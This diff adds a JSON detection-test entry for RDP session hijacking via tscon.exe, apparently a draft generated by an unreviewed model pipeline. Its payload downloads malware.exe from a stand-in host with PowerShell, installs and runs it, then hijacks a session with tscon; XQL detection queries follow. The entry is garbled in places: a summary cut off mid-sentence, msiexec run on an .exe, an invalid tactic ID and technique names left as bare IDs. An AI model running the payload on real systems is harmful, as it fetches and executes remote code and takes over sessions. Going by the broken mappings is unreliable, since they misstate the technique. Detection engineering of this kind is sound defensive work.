@@ -1,0 +1,186 @@
+{
+  "id": "TTP-0000-0138",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "RDP Session Hijacking via tscon.exe",
+    "summary": "An attacker uses tscon.exe to hijack an active RDP session, potentially gaining access to a victim's desktop environment. Cortex should detect the execution of tscon.exe with suspicious parameters and",
+    "description": "An attacker uses tscon.exe to hijack an active RDP session, potentially gaining access to a victim's desktop environment. Cortex should detect the execution of tscon.exe with suspicious parameters and network activity related to session redirection."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1076",
+        "name": "T1076",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1563",
+        "name": "T1563",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\\\temp\\\\malware.exe'\"\nmsiexec.exe /i C:\\temp\\malware.exe /quiet\nC:\\temp\\malware.exe\nC:\\Windows\\System32\\tscon.exe 1 /dest:console",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Execution of tscon.exe with console redirection",
+        "expected_value": "action_process_image_name = 'tscon.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Connection to C2 server on TEST-NET-1",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Downloaded malware file",
+        "expected_value": "action_file_path = 'C:\\\\temp\\\\malware.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Suspicious tscon.exe Usage",
+        "description": "Detection of tscon.exe being executed with parameters that redirect to console",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'tscon.exe'\n| filter action_process_command_line contains '/dest:console'",
+        "mitre_technique_ids": [
+          "T1076",
+          "T1563"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unusual RDP Session Hijacking Behavior",
+        "description": "Detection of a process attempting to hijack an RDP session using tscon.exe",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'tscon.exe'\n| filter action_process_command_line contains '/dest:console'\n| filter causality_actor_process_image_name = 'explorer.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "explorer.exe initiating tscon.exe",
+        "mitre_technique_ids": [
+          "T1076",
+          "T1563",
+          "T1059"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect RDP Session Hijacking via tscon",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'tscon.exe'\n| filter action_process_command_line contains '/dest:console'\n| comp count() by agent_hostname, action_process_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Possible RDP session hijacking using tscon.exe; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/possible-rdp-session-hijacking-using-tscon-exe"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Possible RDP session hijacking using tscon.exe",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/possible-rdp-session-hijacking-using-tscon-exe",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1076",
+      "url": "https://attack.mitre.org/techniques/T1076/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1563",
+      "url": "https://attack.mitre.org/techniques/T1563/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059",
+      "url": "https://attack.mitre.org/techniques/T1059/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
